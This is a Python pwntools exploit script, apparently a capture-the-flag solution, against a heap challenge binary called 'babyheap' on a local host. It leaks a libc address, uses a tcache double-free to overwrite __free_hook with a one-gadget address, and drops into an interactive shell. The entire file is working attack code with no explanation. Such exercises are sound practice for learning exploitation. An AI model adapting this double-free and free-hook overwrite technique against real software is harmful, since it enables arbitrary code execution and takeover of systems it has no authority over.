from pwn import *

elf = ELF("./babyheap")
libc = libc = ELF("./libc.so.6")

shell = ssh(host = "192.168.122.219",user = "test")
script = '\n'.join([
        "set sysroot ./sysroot/",
#        "break *main + 83",
#        "break *main + 121",
#        "break *main + 135",
        "continue",
        ])
#p = gdb.debug(['./babyheap'],ssh=shell,gdbscript=script )
p = remote("192.168.122.219",9002)

p.recvuntil(">>>>> ")
addr_IO_2_1_stdin_ = int((p.recvuntil(" ")[:-1]).decode(),16)
addr_libc_base = addr_IO_2_1_stdin_ - libc.symbols['_IO_2_1_stdin_']
addr__free_hook = addr_libc_base + libc.symbols['__free_hook']
log.info("addr_IO_2_1_stdin_ = " + hex(addr_IO_2_1_stdin_))
log.info("addr_libc_base = " + hex(addr_libc_base))
log.info("addr__free_hook = " + hex(addr__free_hook))


# 1. Alloc
p.recvuntil("> ")
p.sendline("1")
p.recvuntil("Input Content: ")
p.sendline("aaaa")

# 2. Delete
p.recvuntil("> ")
p.sendline("2")

# 2. Delete
p.recvuntil("> ")
p.sendline("2")

# 3. Wipe 
p.recvuntil("> ")
p.sendline("3")

# 1. Alloc
p.recvuntil("> ")
p.sendline("1")
p.recvuntil("Input Content: ")
p.sendline(p64(addr__free_hook))

# 3. Wipe 
p.recvuntil("> ")
p.sendline("3")

# 1. Alloc
p.recvuntil("> ")
p.sendline("1")
p.recvuntil("Input Content: ")
p.sendline("aaaa")

# 3. Wipe 
p.recvuntil("> ")
p.sendline("3")

# 1. Alloc
p.recvuntil("> ")
p.sendline("1")
p.recvuntil("Input Content: ")
p.sendline(p64(addr_libc_base + 0x4f322 ))

p.interactive()



#p = remote("192.168.122.219",9002)
#
#p.interactive()
